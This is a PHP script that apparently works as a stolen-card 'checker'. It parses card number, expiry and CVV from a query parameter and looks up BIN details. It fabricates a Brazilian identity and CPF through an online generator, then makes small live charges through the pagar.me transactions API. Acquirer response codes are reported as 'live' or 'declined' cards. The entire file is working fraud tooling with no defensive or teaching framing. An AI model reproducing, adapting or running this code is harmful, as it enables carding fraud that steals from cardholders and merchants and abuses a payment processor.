<?php
error_reporting(0);
set_time_limit(0);
session_start();

function getStr($string, $inicio, $fim){
    $str = explode($inicio, $string);
    $str = explode($fim, $str[1]);
    return $str[0];
}
if(file_exists(getcwd().'/cookie.txt')){
   unlink('cookie.txt');
}

function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}


$lista = $_GET['lista'];
$card = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[0];
$mes = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[1];
$ano = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[2];
$cvv = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[3];
$code = rand(001, 999);
$time = time();
sleep(4);

$re = array(
  "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
  "Master" => "/^5[1-5]\d{14}$/",
  "Amex" => "/^3[47]\d{13,14}$/",
  "elo" => "/^((((636368)|(438935)|(509000)|(650487)|(650507)|(650905)|(506730)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/",
  "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
);

if (preg_match($re['Visa'], $card)) {
  $tipo = "Visa";
} else if (preg_match($re['Amex'], $card)) {
  $tipo = "Amex";
} else if (preg_match($re['Master'], $card)) {
  $tipo = "Master";
} else if (preg_match($re['elo'], $card)) {
  $tipo = "Elo";
} else {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => "Invalid Card"
  );
  echo json_encode($result);
  exit;
}

$bin1 = substr($card, 0, 6);
$file = 'bins.csv';
$searchfor = $bin1;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
  $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
  $pais = $pieces[4];
  $paiscode = $pieces[5];
  $banco = $pieces[2];
  $level = $pieces[3];
  $bandeira = $pieces[1];
} else {
  $pais = $pieces[5];
  $paiscode = $pieces[6];
  $link = $pieces[7];
  $level = $pieces[4];
  $banco = $pieces[2];
  $bandeira = $pieces[1];
}

function puxar($string, $start, $stop)
{
  $lista = explode($start, $string)[1];
  $texto = explode($stop, $lista)[0];
  return trim($texto);
}

function request($url, $post = false, $header = false)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  if ($post) {
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  }
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
  if ($header) {
      curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
  }
  $exec = curl_exec($ch);
  return $exec;
}

//---------------------------//GERAR DADOS//------------------------//

$nomes = array("Gabriel", "Jose", "Eduardo", "Victor", "Rafael", "Bruno", "Douglas", "Marcos", "Matheus", "Cleiton", "Vaenssa", "Luisa", "Antonia", "Ames", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Elizabeth", "Linda", "Barbara", "Susan", "Jessica", "Margaret", "Sarah", "Alessia", "Alexa", "Alexandra", "Alice", "Alicia", "Aline", "Alison", "Alriana", "Alzira", "Amalia", "Amanda", "Amelia", "America", "Ana", "Anabel", "Anabelle", "Ananda", "Anastacia", "Andrea", "Andressa", "Anete", "Angela", "Angelica", "Angelina", "Anita", "Antuerpia", "Aparecida", "Araci", "Ariane", "Ariene", "Arisla", "Arissa", "Arlette", "Arminda", "Aryana", "Astrid", "Audrey", "Adelinda", "Assun", "Aura", "Aurelia", "Aarao", "Abdala", "Abdemis", "Abel", "Abelardo", "Abraao", "Acacio", "Adalberto", "Adamastor", "Adao", "Adauto", "Ademar", "Jose", "Lucas", "Ayrton", "Patricia", "Patrick", "Diego", "Arnaldo", "Josevaldo", "Aiyrton", "Renan", "Maria", "Genivaldo", "Joseph", "Michel", "Otavio", "Miguel", "Thais", "Carol", "Carlos", "Edvaldo", "Luiza");

$sobreNome = array("Abreu", "Ribeiro", "Rocha", "Lima", "Godoy", "Diniz", "Andrade", "Oliveira", "Martins", "Ferreira", "Souza", "Silva", "Araujo", "Montenegro", "Anciaes", "Junior", "Andrades", "monteiro", "Joaquin", "Coltinho");

$rand1 = rand(0, 107);

$rand2 = rand(0, 19);

$rand3 = rand(0, 4);

$nome = $nomes[$rand1];

$sobre = $sobreNome[$rand2];

$mail = array("yahoo", "gmail", "bol", "hotmail", "outlook");

$Mail = $mail[$rand3];

$valueDebit = rand(100, 200);

$horario = date("H:i:s");
$data = date("d/m/y");
$ip = $_SERVER['REMOTE_ADDR'];

//---------------------------//Gerador 4Devs//------------------------//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . "/4devsdados.txt");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/4devsdados.txt");
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=H&idade=22&pontuacao=S&cep_estado=&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, 1);

$name = $dados1["nome"];
$email = $dados1["email"];
$cpf = $dados1["cpf"];
$rg = $dados1["rg"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$numero = $dados1["numero"];
$bairro = $dados1["bairro"];
$cidade = $dados1["cidade"];
$estado = $dados1["estado"];
$telefone_fixo = $dados1["telefone_fixo"];
$celular = $dados1["celular"];

/////////////////////////////////////////////////////////////////////////
$email2 = "$nome$sobre" . rand(000000, 99999) . "@$Mail.com";
$nomes2 = "$nome $sobre";
$senha1 = rand(000000, 99999999);
/////////////////////////////////////////////////////////////////////////



$post = '{
  "api_key": "ak_live_AQUI",
  "amount": ' . $valueDebit . ',
  "card_number": "' . $card . '",
  "card_cvv": "' . $cvv . '",
  "card_expiration_date": "' . $mes . '' . $ano . '",
  "card_holder_name": "' . $nomes2 . '",
  "customer": {
    "external_id": "#3311",
    "name": "' . $nomes2 . '",
    "type": "individual",
    "country": "br",
    "email": "' . $email2 . '",
    "documents": [
      {
        "type": "cpf",
        "number": "' . $cpf . '"
      }
    ],
    "phone_numbers": ["+5511999998888", "+5511888889999"],
    "birthday": "1965-01-01"
  },
  "billing": {
    "name": "' . $nomes2 . '",
    "address": {
      "country": "br",
      "state": "' . $estado . '",
      "city": "' . $cidade . '",
      "neighborhood": "' . $bairro . '",
      "street": "' . $endereco . '",
      "street_number": "' . $numero . '",
      "zipcode": "23515000"
    }
  },
  "shipping": {
    "name": "' . $nomes2 . '",
    "fee": 1000,
    "delivery_date": "2000-12-21",
    "expedited": true,
    "address": {
      "country": "br",
       "state": "' . $estado . '",
      "city": "' . $cidade . '",
      "neighborhood": "' . $bairro . '",
      "street": "' . $endereco . '",
      "street_number": "' . $numero . '",
      "zipcode": "23515000"
    }
  },
  "items": [
    {
      "id": "r123",
      "title": "Red pill",
      "unit_price": 10000,
      "quantity": 1,
      "tangible": true
    },
    {
      "id": "b123",
      "title": "Blue pill",
      "unit_price": 10000,
      "quantity": 1,
      "tangible": true
    }
  ]
}';
$d1 = request("https://api.pagar.me/1/transactions", $post, array(
  'Content-Type: application/json'
));
$formatted = substr_replace($valueDebit, ",", -2, 0);
$valueDebitFormatted = " | Valor: " . $formatted . " | ";

if (strpos($d1, '"acquirer_response_code":"0000"')) {
  $result = array(
      'live' => true,
      'status' => 'approved',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [0000]"
  );
} elseif (strpos($d1, '"authorized"')) {
  $result = array(
      'live' => true,
      'status' => 'approved',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Authorized]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"1022"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [1022]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"1000"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [1000]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"1004"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Restrict card]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"5097"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Erro interno]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"1016"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Sem saldo]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"9103"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Cartão cancelado]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"5088"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Transação recusada]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"1011"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Invalid card]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"1019"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Transação não permitida]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"1001"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Cartão vencido]"
  );
} elseif (strpos($d1, '"acquirer_response_code":"5000"')) {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Transação não autorizada]"
  );
} else {
  $result = array(
      'live' => false,
      'status' => 'declined',
      'card' => htmlspecialchars(stripslashes(strip_tags(substr($_GET["lista"], 0, 6)))) . "$valueDebitFormatted ($bandeira) $banco $level $pais [Transação não permitida]"
  );
}
echo json_encode($result);